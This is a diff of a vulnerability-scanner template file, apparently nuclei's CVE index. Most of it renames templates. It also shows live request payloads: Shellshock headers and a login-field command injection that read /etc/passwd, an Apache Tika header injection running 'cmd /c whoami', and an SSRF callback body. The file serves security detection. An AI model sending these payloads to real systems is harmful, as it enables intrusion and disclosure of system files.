@@ -3325,7 +3325,7 @@
     {
       "id": "CVE-2014-4942",
       "info": {
-        "name": "WP EasyCart - Information Disclosure",
+        "name": "WordPress EasyCart <2.0.6 - Information Disclosure",
         "severity": "low"
       },
       "requests": [
@@ -3391,9 +3391,9 @@
       "requests": [
         {
           "headers": {
-            "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
+            "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -3836,7 +3836,7 @@
     {
       "id": "CVE-2015-3035",
       "info": {
-        "name": "Multiple TP-LINK Products Vulnerable - Local File Inclusion",
+        "name": "TP-LINK - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -4023,7 +4023,7 @@
     {
       "id": "CVE-2015-4668",
       "info": {
-        "name": "Xsuite 2.4.4.5 - Open Redirect",
+        "name": "Xsuite <=2.4.4.5 - Open Redirect",
         "severity": "medium"
       },
       "requests": [
@@ -4068,7 +4068,7 @@
     {
       "id": "CVE-2015-5461",
       "info": {
-        "name": "StageShow <= 5.0.8 - Open Redirect",
+        "name": "WordPress StageShow <5.0.9 - Open Redirect",
         "severity": "medium"
       },
       "requests": [
@@ -4083,7 +4083,7 @@
     {
       "id": "CVE-2015-5469",
       "info": {
-        "name": "Wordpress MDC YouTube Downloader plugin v2.1.0 - Remote file download",
+        "name": "WordPress MDC YouTube Downloader 2.1.0 - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -4190,7 +4190,7 @@
     {
       "id": "CVE-2015-7245",
       "info": {
-        "name": "D-Link DVG-N5402SP - Path Traversal",
+        "name": "D-Link DVG-N5402SP - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -4263,7 +4263,7 @@
     {
       "id": "CVE-2015-7823",
       "info": {
-        "name": "Kentico CMS 8.2 Open Redirection",
+        "name": "Kentico CMS 8.2 - Open Redirect",
         "severity": "low"
       },
       "requests": [
@@ -4293,7 +4293,7 @@
     {
       "id": "CVE-2015-8399",
       "info": {
-        "name": "Atlassian Confluence configuration files read",
+        "name": "Atlassian Confluence <5.8.17 - Information Disclosure",
         "severity": "medium"
       },
       "requests": [
@@ -5736,7 +5736,7 @@
     {
       "id": "CVE-2017-17736",
       "info": {
-        "name": "Kentico - Unauthenticated Administration Dashboard",
+        "name": "Kentico - Installer Privilege Escalation",
         "severity": "critical"
       },
       "requests": [
@@ -6756,11 +6756,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
-            "X-Tika-OCRTesseractPath": "cscript",
             "X-Tika-OCRLanguage": "//E:Jscript",
             "Expect": "100-continue",
             "Content-type": "image/jp2",
-            "Connection": "close"
+            "Connection": "close",
+            "X-Tika-OCRTesseractPath": "cscript"
           },
           "method": "PUT",
           "path": [
@@ -10304,8 +10304,8 @@
         {
           "body": "url=https://{{Host}}:443@{{interactsh-url}}\n",
           "headers": {
-            "Content-Type": "application/x-www-form-urlencoded",
-            "X-Atlassian-Token": "no-check"
+            "X-Atlassian-Token": "no-check",
+            "Content-Type": "application/x-www-form-urlencoded"
           },
           "method": "POST",
           "path": [
@@ -11046,7 +11046,7 @@
     {
       "id": "CVE-2020-13820",
       "info": {
-        "name": "Extreme Management Center 8.4.1.24 - Cross Site Scripting",
+        "name": "Extreme Management Center 8.4.1.24 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -11113,7 +11113,7 @@
     {
       "id": "CVE-2020-13945",
       "info": {
-        "name": "Apache APISIX's Admin API Default Access Token (RCE)",
+        "name": "Apache APISIX - Insufficiently Protected Credentials",
         "severity": "medium"
       },
       "requests": [
@@ -11203,7 +11203,7 @@
     {
       "id": "CVE-2020-14750",
       "info": {
-        "name": "Oracle WebLogic Server - Remote Code Execution",
+        "name": "Oracle WebLogic Server - Remote Command Execution",
         "severity": "critical"
       },
       "requests": [
@@ -11818,8 +11818,8 @@
         {
           "body": "op=login&username=;`cat /etc/passwd`&password=\n",
           "headers": {
-            "Referer": "{{Hostname}}/module/login/login.html",
-            "Content-Type": "application/x-www-form-urlencoded"
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Referer": "{{Hostname}}/module/login/login.html"
           },
           "method": "POST",
           "path": [
@@ -13877,7 +13877,7 @@
     {
       "id": "CVE-2021-1472",
       "info": {
-        "name": "Cisco Small Business RV Series - Authentication Bypass and Command Injection",
+        "name": "Cisco Small Business RV Series - OS Command Injection",
         "severity": "critical"
       },
       "requests": [
@@ -14352,7 +14352,7 @@
     {
       "id": "CVE-2021-21805",
       "info": {
-        "name": "Advantech R-SeeNet v 2.4.12 - OS Command Injection",
+        "name": "Advantech R-SeeNet 2.4.12 - OS Command Injection",
         "severity": "critical"
       },
       "requests": [
@@ -14780,7 +14780,7 @@
     {
       "id": "CVE-2021-24236",
       "info": {
-        "name": "WordPress Plugin Imagements 1.2.5 - Unauthenticated Arbitrary File Upload",
+        "name": "WordPress Imagements <=1.2.5 - Arbitrary File Upload",
         "severity": "critical"
       },
       "requests": [
@@ -14888,7 +14888,7 @@
     {
       "id": "CVE-2021-24284",
       "info": {
-        "name": "WordPress Kaswara Modern VC Addons - File Upload RCE",
+        "name": "WordPress Kaswara Modern VC Addons <=3.0.1 - Arbitrary File Upload",
         "severity": "critical"
       },
       "requests": [
@@ -15081,7 +15081,7 @@
     {
       "id": "CVE-2021-24370",
       "info": {
-        "name": "Fancy Product Designer WordPress plugin - Remote Code Execution (Detection)",
+        "name": "WordPress Fancy Product Designer <4.6.9  - Arbitrary File Upload",
         "severity": "critical"
       },
       "requests": [
@@ -18664,7 +18664,7 @@
     {
       "id": "CVE-2021-45046",
       "info": {
-        "name": "Apache Log4j2 Remote Code Injection",
+        "name": "Apache Log4j2 - Remote Code Injection",
         "severity": "critical"
       },
       "requests": [
@@ -19981,7 +19981,7 @@
     {
       "id": "CVE-2022-21705",
       "info": {
-        "name": "OctoberCMS Authenticated Remote Code Execution",
+        "name": "October CMS -  Remote Code Execution",
         "severity": "high"
       },
       "requests": [
@@ -20090,7 +20090,7 @@
     {
       "id": "CVE-2022-22965",
       "info": {
-        "name": "Spring Framework - Remote Code Execution",
+        "name": "Spring - Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -20441,7 +20441,7 @@
     {
       "id": "CVE-2022-2486",
       "info": {
-        "name": "Wavlink Mesh.cgi - Remote Code Execution",
+        "name": "Wavlink WN535K2/WN535K3 - OS Command Injection",
         "severity": "critical"
       },
       "requests": [
@@ -20455,7 +20455,7 @@
     {
       "id": "CVE-2022-2487",
       "info": {
-        "name": "Wavlink Nightled.cgi - Remote Code Execution",
+        "name": "Wavlink WN535K2/WN535K3 - OS Command Injection",
         "severity": "critical"
       },
       "requests": [
@@ -20469,7 +20469,7 @@
     {
       "id": "CVE-2022-2488",
       "info": {
-        "name": "Wavlink Touchlist_sync.cgi - Remote Code Execution",
+        "name": "Wavlink WN535K2/WN535K3 - OS Command Injection",
         "severity": "critical"
       },
       "requests": [
@@ -20607,7 +20607,7 @@
     {
       "id": "CVE-2022-2546",
       "info": {
-        "name": "All-in-One WP Migration plugin - Cross-Site Scripting (XSS)",
+        "name": "WordPress All-in-One WP Migration <=7.62 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -20986,7 +20986,7 @@
     {
       "id": "CVE-2022-29078",
       "info": {
-        "name": "Ejs - RCE",
+        "name": "Node.js Embedded JavaScript 3.1.6 - Template Injection",
         "severity": "critical"
       },
       "requests": [
@@ -21285,7 +21285,7 @@
     {
       "id": "CVE-2022-31126",
       "info": {
-        "name": "Roxy-WI - Unauthenticated Remote Code Execution",
+        "name": "Roxy-WI <6.1.1.0 - Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -21419,7 +21419,7 @@
     {
       "id": "CVE-2022-31814",
       "info": {
-        "name": "PfSense Pfblockerng Plugin - Remote Code execution",
+        "name": "pfSense pfBlockerNG <=2.1..4_26 - OS Command Injection",
         "severity": "critical"
       },
       "requests": [
@@ -21872,16 +21872,36 @@
     {
       "id": "CVE-2022-35405",
       "info": {
-        "name": "Zoho ManageEngine Password Manager Pro and PAM 360 - Unauthenticated Remote Command Execution",
+        "name": "Zoho ManageEngine - Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
         {
-          "raw": [
-            "POST /xmlrpc HTTP/1.1\nHost: {{Hostname}}\n\n<?xml version=\"1.0\"?><methodCall><methodName>{{randstr}}</methodName><params><param><value>big0us</value></param></params></methodCall>\n",
-            "POST /xmlrpc HTTP/1.1\nHost: {{Host}}:7272\n\n<?xml version=\"1.0\"?><methodCall><methodName>{{randstr}}</methodName><params><param><value>big0us</value></param></params></methodCall>\n",
-            "POST /xmlrpc HTTP/1.1\nHost: {{Host}}:8282\n\n<?xml version=\"1.0\"?><methodCall><methodName>{{randstr}}</methodName><params><param><value>big0us</value></param></params></methodCall>\n",
-            "POST /xmlrpc HTTP/1.1\nHost: {{Host}}:9292\n\n<?xml version=\"1.0\"?><methodCall><methodName>{{randstr}}</methodName><params><param><value>big0us</value></param></params></methodCall>\n"
+          "body": "<?xml version=\"1.0\"?><methodCall><methodName>{{randstr}}</methodName><params><param><value>big0us</value></param></params></methodCall>\n",
+          "method": "POST",
+          "path": [
+            "{{RootURL}}/xmlrpc"
+          ]
+        },
+        {
+          "body": "<?xml version=\"1.0\"?><methodCall><methodName>{{randstr}}</methodName><params><param><value>big0us</value></param></params></methodCall>\n",
+          "method": "POST",
+          "path": [
+            "{{RootURL}}:8282/xmlrpc"
+          ]
+        },
+        {
+          "body": "<?xml version=\"1.0\"?><methodCall><methodName>{{randstr}}</methodName><params><param><value>big0us</value></param></params></methodCall>\n",
+          "method": "POST",
+          "path": [
+            "{{RootURL}}:9292/xmlrpc"
+          ]
+        },
+        {
+          "body": "<?xml version=\"1.0\"?><methodCall><methodName>{{randstr}}</methodName><params><param><value>big0us</value></param></params></methodCall>\n",
+          "method": "POST",
+          "path": [
+            "{{RootURL}}:7272/xmlrpc"
           ]
         }
       ]
@@ -21992,7 +22012,7 @@
     {
       "id": "CVE-2022-37042",
       "info": {
-        "name": "Zimbra Collaboration Suite - Unauthenticated RCE",
+        "name": "Zimbra Collaboration Suite 8.8.15/9.0 - Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
